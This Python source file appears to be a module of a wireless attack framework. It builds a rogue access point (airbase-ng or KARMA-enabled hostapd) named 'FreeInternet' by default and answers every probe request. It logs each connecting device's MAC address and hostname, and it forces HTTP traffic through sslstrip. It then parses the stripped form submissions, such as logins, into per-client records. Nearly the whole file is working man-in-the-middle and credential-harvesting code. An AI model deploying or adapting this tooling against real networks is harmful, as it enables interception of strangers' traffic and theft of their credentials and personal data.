from run_prog import run_program
import time
import netifaces
import logging
import sys
import includes.monitor_mode as mm
from collections import deque
import pyinotify
import os
from includes.fonts import *
from dateutil import parser
import urlparse
import re

class EventHandler(pyinotify.ProcessEvent):
    def process_IN_MODIFY(self, event):
        if os.path.basename(event.path) == "dhcpd.leases":
            self.someInstance.check_new_leases()
        elif os.path.basename(event.path) == "sslstrip.log":
            self.someInstance.check_sslstrip()

class rogueAP:
    """Create a rogue access point"""
    def __init__(self, **kwargs):

        self.ssid = kwargs.get("ssid", "FreeInternet")
        self.wlan_iface = kwargs.get("wlan_iface", "mon0")    # If none, will use first wlan capable of injection
        self.net_iface = kwargs.get("net_iface", "eth0")    # iface with outbound internet access
        self.enable_mon = kwargs.get("enable_mon", False)   # airmon-ng start <wlan_iface> 
        self.promisc =   kwargs.get("promisc", False)       # Answer all probe requests
        self.do_sslstrip = kwargs.get("sslstrip", False)
        self.rogueif = kwargs.get("rogueif", "wlan5")       # Answer all probe requests
        self.hostapd = kwargs.get("hostapd", False)       # Use hostapd instead of airbase-ng
        self.hapdconf = kwargs.get("hapdconf", "/etc/hostapd.conf")       # Config file to use for hostapd
        self.hapdcmd = kwargs.get("hapdcmd", "/root/hostapd/2.1-karmaian/hostapd/hostapd")       # Binary to use for hostapd

        self.procs = {} #Var to hold external processes, and ensure they keep running
        self.num_procs = 2 # How many procs should be run
        self.verb = kwargs.get('verbose', 0)

        self.already_seen={}
        self.new_leases = deque()
        self.ssl_strip_data = deque()

        if self.do_sslstrip == "True":
            self.do_sslstrip = True
            #self.num_procs += 1
        else:
            self.do_sslstrip = False
        if self.promisc == "True":
            self.promisc = True
        else:
            self.promisc = False
        if self.enable_mon == "True":
            self.enable_mon = True
        else:
            self.enable_mon = False
        if self.hostapd == "True":
            self.hostapd = True
        else:
            self.hostapd = False

        if self.enable_mon:
            self.wlan_iface=mm.enable_monitor_mode(self.wlan_iface)

        if not self.wlan_iface:
            logging.error("No wlan_iface specified for rogueAP :(")
            if not self.hostapd:
                sys.exit(-1)        
        if self.hostapd:
            airb_opts = [self.hapdconf]    
            self.airb_cmd = [self.hapdcmd] + airb_opts
            self.rogueif = self.wlan_iface
        else:
            self.rogueif = "at0"
            if self.promisc:    
                airb_opts = ['-e', self.ssid, '-P', self.wlan_iface]
            else:
                airb_opts = ['-e', self.ssid, self.wlan_iface]
            self.airb_cmd = ['airbase-ng'] + airb_opts

        self.airb_cmd = " ".join(self.airb_cmd)      
        self.set_ip_cmd = "ifconfig "+self.rogueif+" up 10.0.0.1 netmask 255.255.255.0"
        hapd_config_file ="""
interface="""+self.rogueif+"""
bssid=00:11:22:33:44:00
driver=nl80211
ssid="""+self.ssid+"""
channel=6
disassoc_low_ack=0
auth_algs=3
ignore_broadcast_ssid=0
logger_syslog=-1
logger_stdout=-1
logger_syslog_level=1
logger_stdout_level=1
dump_file=/tmp/hostapd.dump
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
macaddr_acl=0
enable_karma=1
"""
        f=open('/etc/hostapd.conf', 'w')
        f.write(hapd_config_file)
        f.close()
        
        # Vars for DHCP server
        config_file ="""
dhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,8765h
dhcp-option=3,10.0.0.1
dhcp-option=6,8.8.8.8
dhcp-leasefile=/etc/dhcpd.leases
"""
        f=open('/etc/dnsmasq.conf', 'w')
        f.write(config_file)
        f.close()
        self.launch_dhcp = "dnsmasq -d -a 10.0.0.1 -i "+self.rogueif+" -C /etc/dnsmasq.conf"

        # Monitor dhcpd.lease file for updates
        with file("/etc/dhcpd.leases", 'a'):
            os.utime("/etc/dhcpd.leases", None)

        # Monitor dhcpd.lease file for updates
        with file("/tmp/sslstrip.log", 'a'):
            os.utime("/tmp/sslstrip.log", None)

        wm = pyinotify.WatchManager() # Watch Manager
        wdd = wm.add_watch(['/etc/dhcpd.leases', '/tmp/sslstrip.log'], pyinotify.IN_MODIFY, rec=True)

        handler = EventHandler()
        handler.someInstance = self

        self.notifier = pyinotify.ThreadedNotifier(wm, handler)
        self.notifier.start()

        # SSL Strip
        self.launch_sslstrip = "sslstrip_snoopy -w /tmp/sslstrip.log -f"
        self.fo_ssl = open("/tmp/sslstrip.log", "r")

        if self.do_sslstrip:
            self.run_sslstrip()

    def run_ap(self):
        run_program("killall airbase-ng hostapd")
        time.sleep(4)

        # Make sure interface exists
        if self.wlan_iface not in netifaces.interfaces():
            logging.error("No such interface: '%s'" % self.wlan_iface)
            if not self.hostapd:
                return False
        proc = run_program(self.airb_cmd)
        if proc.poll():
            logging.error("Airbase has terminated. Cannot continue.")
            return False

        # Wait for airbase self.rogueif interface to come up
        while self.rogueif not in netifaces.interfaces(): #Should add a timeout
            logging.debug("Waiting for airbase interface to come up.")
            time.sleep(1)

        self.procs['airbase'] = proc
        logging.debug("Airbase interface is up. Setting IP...")
        run_program(self.set_ip_cmd)

        # Wait for IP to be set
        ipSet = False
        while not ipSet:
            try:
                if netifaces.ifaddresses(self.rogueif)[2][0]['addr']:
                    ipSet = True
            except Exception:
                time.sleep(2)
                pass

        logging.info("IP address for access point has been set.")
        return True
       
    def run_dhcpd(self):
        run_program("killall dnsmasq")
        time.sleep(3)
        proc = run_program(self.launch_dhcp)
        if proc.poll():
            response = proc.communicate()
            response_stdout, response_stderr = response[0], response[1]
            if response_stderr:
                logging.error(response_stderr)
            else:
                logging.error("Unable to launch dhcp server.")
                return False
        self.procs['dhcp'] = proc
        return True

    def run_sslstrip(self):
        run_program("killall sslstrip")
        time.sleep(2)
        proc = run_program(self.launch_sslstrip)
        if proc.poll():
            response = proc.communicate()
            response_stdout, response_stderr = response[0], response[1]
            if response_stderr:
                logging.error(response_stderr)
            else:
                logging.error("Unable to launch sslstrip.")
                return False
        self.procs['sslstrip'] = proc
        return True

    def check_new_leases(self):
        try:
            lines = [line.strip() for line in open('/etc/dhcpd.leases')]
        except Exception, e:
            logging.warning("Unable to open DHCP lease file. It's probably waiting to be created")
            return
        for line in lines:
            try:
                line = line.split()
                ltime, mac, ip = line[0], line[1], line[2]
                mac = re.sub(':', '', mac)
                hostname = " ".join(line[3:-1])
                if mac not in self.already_seen:
                    self.new_leases.append({'mac':mac, 'leasetime':ltime, 'ip':ip, 'hostname':hostname})
                    self.already_seen[mac] = 1
                    if self.verb > 0:
                        logging.info("New %sDHCP lease%s handed out to %s%s (%s)%s" % (GR,G,GR,mac,hostname,G))
            except Exception,e:
                logging.error("Badly formed DHCP lease - '%s'" % line)

    def get_new_leases(self):
        #self.__check_new_leases()
        rtnData=[]
        while self.new_leases:
            rtnData.append(self.new_leases.popleft())
        if rtnData:
            return [("dhcp_leases", rtnData)]
        else:
            return []

    def do_nat(self):
        # Handle NAT
        ipt = ['iptables -F', 'iptables -F -t nat', 'iptables -t nat -A POSTROUTING -o %s -j MASQUERADE'%self.net_iface,  'iptables -A FORWARD -i '+self.rogueif+' -o %s -j ACCEPT'%self.net_iface]
        if self.do_sslstrip:
            ipt.insert(2, 'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
        for rule in ipt:
            run_program(rule)
        run_program("sysctl -w net.ipv4.ip_forward=1")


    def get_ssl_data(self):
        rtnData=[]
        while self.ssl_strip_data:
            rtnData.append(self.ssl_strip_data.popleft())
        if rtnData: 
            return [("sslstrip", rtnData)]
        else:
            return []

    def check_sslstrip(self):
        # Format when reading should be:
        # First line: DATE, SIZE, SECURE, METHOD Data (<site>)
        # Next line: key=val&key=val
        lines = self.fo_ssl.readlines()
        for l_num in range (len(lines)):
            line = lines[l_num]
            if "," in line:
                try:
                    date = parser.parse( line.split(",")[0] )
                    domain = re.search("\((.*?)\)",line).group(1)
                    client = re.search("Client:(.*?) ",line).group(1)
                    url = re.search("URL\((.*)\)URL:",line).group(1)
                except Exception, e:
                    logging.error("%s%sUnable to parse sslstrip.log. Are you using the SensePost version?%s%s" % (F,R,G,NF))
                    logging.error(e)
                else:
                    l_num+=1
                    data = lines[l_num]
                    data = dict(urlparse.parse_qsl(data.rstrip()))
                    if self.verb > 0:
                        logging.info("New %ssslstrip%s data for domain %s%s%s" % (GR,G,GR,domain,G))
                    for key, val in data.iteritems():
                        self.ssl_strip_data.append({'date': date, 'key' : key, 'value':val, 'client':client, 'url':url, 'domain':domain})

    def all_OK(self):
        # Ensure DHCP + AP remain up.
        if len(self.procs) < self.num_procs:
            return False # Still starting up
        for name, proc in self.procs.iteritems():
            if proc.poll():
                logging.error("Process for %s has died, cannot continue. Sorry." % name) 
                return False
        return True

    def shutdown(self):
        #Kill kill kill
        self.notifier.stop()
        run_program("killall airbase-ng")
        run_program("killall hostapd")
        run_program("killall dnsmasq")
        run_program("killall sslstrip")
        run_program("iptables -F")
        run_program("iptables -F -t nat")
        run_program("sysctl -w net.ipv4.ip_forward=0")
        os.remove("/etc/dhcpd.leases")
        os.remove("/tmp/sslstrip.log")
